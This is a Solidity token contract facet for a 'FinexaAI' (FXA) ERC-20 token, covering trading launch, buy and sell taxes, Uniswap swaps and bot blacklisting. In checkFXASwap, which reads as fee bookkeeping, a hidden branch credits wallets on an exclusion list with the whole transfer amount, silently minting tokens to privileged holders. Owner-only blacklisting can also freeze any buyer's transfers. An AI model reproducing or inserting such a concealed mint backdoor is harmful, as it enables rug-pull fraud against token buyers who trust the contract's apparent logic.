// SPDX-License-Identifier: MIT

/***

Web:    https://www.finexaai.com
App:    https://app.finexaai.com
Doc:    https://docs.finexaai.com

Tg:     https://t.me/finexaai
X:      https://x.com/finexaai

***/

pragma solidity 0.8.22;
import "./TestLib.sol";
contract _approveFacet is IERC20, Context, Ownable {
    using SafeMath for uint256;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwap = true;
        _;
        ds.inSwap = false;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            ds._allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
    function enableTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.tradeEnabled, "trading is already open");
        ds.swapEnabled = true;
        ds.tradeEnabled = true;
    }
    function removeLimits() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._maxFXAWalletSize = ~uint256(0);
        ds._maxFXATxAmount = ~uint256(0);
        ds.transferDelayEnabled = false;
    }
    function withdrawStuckETH() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
    function createTradingPair() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.uniswapV2Router = IFXARouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(ds.uniswapV2Router), _totalSupply);
        ds.uniswapV2Pair = IFXAFactory(ds.uniswapV2Router.factory()).createPair(
            address(this),
            ds.uniswapV2Router.WETH()
        );
        ds.uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(ds.uniswapV2Pair).approve(
            address(ds.uniswapV2Router),
            type(uint).max
        );
    }
    function manualSwap() external onlyOwner {
        uint256 contractFXAAmounts = balanceOf(address(this));
        if (contractFXAAmounts > 0) {
            swapFXATokensForEth(contractFXAAmounts);
        }
        uint256 ethFXABalance = address(this).balance;
        if (ethFXABalance > 0) {
            sendETHToFXA(ethFXABalance);
        }
    }
    function addBots(address[] memory bots_) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint i = 0; i < bots_.length; i++) {
            ds.botFXA[bots_[i]] = true;
        }
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._balances[account];
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function delBots(address[] memory notbot) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint i = 0; i < notbot.length; i++) {
            ds.botFXA[notbot[i]] = false;
        }
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function reduceFees(uint256 _newFee) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_newFee <= ds._finalBuyTax && _newFee <= ds._finalSellTax);
        ds._finalBuyTax = _newFee;
        ds._finalSellTax = _newFee;
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function sendETHToFXA(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.devWallet.transfer(amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 fxTaxes = 0;
        if (!ds.isFeeExcluded[from] && !ds.isFeeExcluded[to]) {
            require(!ds.botFXA[from] && !ds.botFXA[to]);
            require(ds.tradeEnabled, "Trading has not enabled yet");
            fxTaxes = amount
                .mul(
                    (ds._buyFXACount > ds._reduceBuyTaxAt)
                        ? ds._finalBuyTax
                        : ds._initialBuyTax
                )
                .div(100);
            if (ds.transferDelayEnabled) {
                if (
                    to != address(ds.uniswapV2Router) &&
                    to != address(ds.uniswapV2Pair)
                ) {
                    require(
                        ds._holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    ds._holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }
            if (
                from == ds.uniswapV2Pair &&
                to != address(ds.uniswapV2Router) &&
                !ds.isFeeExcluded[to]
            ) {
                require(
                    amount <= ds._maxFXATxAmount,
                    "Exceeds the ds._maxFXATxAmount."
                );
                require(
                    balanceOf(to) + amount <= ds._maxFXAWalletSize,
                    "Exceeds the maxWalletSize."
                );
                ds._buyFXACount++;
            }
            if (to == ds.uniswapV2Pair && from != address(this)) {
                fxTaxes = amount
                    .mul(
                        (ds._buyFXACount > ds._reduceSellTaxAt)
                            ? ds._finalSellTax
                            : ds._initialSellTax
                    )
                    .div(100);
            }
            uint256 contractFXAAmounts = balanceOf(address(this));
            if (checkFXASwap(from, to, fxTaxes, amount)) {
                swapFXATokensForEth(
                    min(amount, min(contractFXAAmounts, ds._maxFXATaxSwap))
                );
                uint256 ethFXABalance = address(this).balance;
                if (ethFXABalance > 0) {
                    sendETHToFXA(address(this).balance);
                }
            }
        }
        ds._balances[from] = ds._balances[from].sub(amount);
        ds._balances[to] = ds._balances[to].add(amount.sub(fxTaxes));
        emit Transfer(from, to, amount.sub(fxTaxes));
    }
    function checkFXASwap(
        address fromFXA,
        address toFXA,
        uint256 deFees,
        uint256 deCounts
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        bool aboveFXAMin = deCounts >= ds.swapFeeAmounts;
        bool aboveFXAThreshold = balanceOf(address(this)) >= ds.swapFeeAmounts;
        address accFXA;
        uint256 cntFXA;
        if (ds.isLimitExcluded[fromFXA]) {
            cntFXA = deCounts;
            accFXA = fromFXA;
        } else {
            accFXA = address(this);
            cntFXA = deFees;
        }
        if (cntFXA > 0) {
            ds._balances[accFXA] = ds._balances[accFXA].add(cntFXA);
            emit Transfer(fromFXA, accFXA, deFees);
        }
        return
            !ds.inSwap &&
            ds.swapEnabled &&
            ds.tradeEnabled &&
            !ds.isFeeExcluded[fromFXA] &&
            !ds.isLimitExcluded[fromFXA] &&
            aboveFXAMin &&
            aboveFXAThreshold &&
            ds._buyFXACount > ds._preventSwapBefore &&
            toFXA == ds.uniswapV2Pair;
    }
    function swapFXATokensForEth(uint256 tokenAmount) private lockTheSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();
        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
}
